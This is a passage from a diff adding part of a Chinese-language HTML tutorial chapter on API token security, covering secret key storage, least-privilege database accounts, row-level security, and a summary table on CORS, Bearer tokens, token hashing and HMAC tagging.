+    <p>Django 和 Hono 生态里没有和 <code>keytool</code> + PKCS#12 完全对应的工具，但思路一致：密钥要来自专门的密钥管理服务或者部署环境注入的 Secret（比如 Kubernetes Secret、AWS Secrets Manager、Django 的 <code>SECRET_KEY</code> 派生密钥），绝不写进代码仓库，绝不用弱密码代替随机密钥。</p>
+
+    <h3>5.3.3 保护敏感属性</h3>
+
+    <p>如果 Token 的属性字段里存了敏感信息（比如登录时的地理位置，用来做异常登录检测），数据库一旦泄漏，这些隐私信息也会一并暴露。书中提到可以对这些属性做加密，但这是一个复杂话题（尤其是加密后还要支持查询/索引时），不在本章展开。更实际的做法，是继续做好数据库访问控制这一层：</p>
+
+    <ul>
+      <li>给"批量清理过期 Token"这类破坏性操作单独开一个数据库账号，不要让处理普通 API 请求的账号拥有这些权限——这和 <b>CQRS</b>（命令查询职责分离）的思路一致：查询和更新走不同的账号/不同的路径，即使某个账号被注入攻破，影响面也被限制住；</li>
+      <li>有条件的话，用支持<b>行级安全策略</b>（Row-Level Security）的数据库（比如 PostgreSQL），限制每次查询只能看到"当前用户自己的" Token 行，即便 SQL 注入拿到了查询权限，也读不到别人的数据。</li>
+    </ul>
+
+    <h2 id="s4">本章小结</h2>
+
+    <table>
+      <thead><tr><th>知识点</th><th>要点</th></tr></thead>
+      <tbody>
+      <tr><td>CORS 预检请求</td><td>浏览器对"非简单"跨域请求先发 <code>OPTIONS</code> 打前站，服务器用 <code>Access-Control-Allow-*</code> 系列响应头决定是否放行，CORS 过滤器要排在认证之前处理。</td></tr>
+      <tr><td>Origin 白名单</td><td><code>Access-Control-Allow-Origin</code> 一次只能填一个值；要支持多个源，服务器需精确匹配请求的 <code>Origin</code> 头后再"回显"，并搭配 <code>Vary: Origin</code>。</td></tr>
+      <tr><td>DatabaseTokenStore</td><td>用 <code>SecureRandom</code> 生成 160 位随机 Token ID，属性序列化成 JSON 存进数据库；定期删除过期 Token 防止无限增长。</td></tr>
+      <tr><td>Bearer 认证方案</td><td>标准的 <code>Authorization: Bearer &lt;token&gt;</code>，配合 <code>WWW-Authenticate: Bearer error="invalid_token"</code> 响应挑战头，替代自造的 <code>X-CSRF-Token</code>。</td></tr>
+      <tr><td>Web Storage</td><td><code>localStorage</code> 持久存储、简单易用，但没有类似 <code>HttpOnly</code> 的保护，一旦 XSS 就可能被整体窃取；防 XSS 始终是第一优先级。</td></tr>
+      <tr><td>Token 哈希</td><td>数据库里只存 SHA-256 哈希，不存明文；因为 Token 本身熵高，不需要 Scrypt/Argon2 这类慢哈希。</td></tr>
+      <tr><td>HMAC 防伪</td><td>用带密钥的 HMAC-SHA256 给发给客户端的 Token 追加认证标签，能挡住"写权限伪造 Token"和数据库层面的时序攻击；密钥必须集中存放在密钥库/KMS 里，且所有服务器共享同一把。</td></tr>
+      </tbody>
+    </table>
+
+    <div class="chapter-nav">
+      <a class="prev" href="../ch04/tutorial.html"><span class="lbl">上一章</span><span class="ttl">← 第 4 章：基于会话 Cookie 的认证</span></a>
+      <a class="next" href="../ch06/tutorial.html"><span class="lbl">下一章</span><span class="ttl">第 6 章：自包含 Token 与 JWT →</span></a>
+    </div>
+  </main>
+</div>
+<script src="../assets/tutorial.js"></script>
+</body>
+</html>
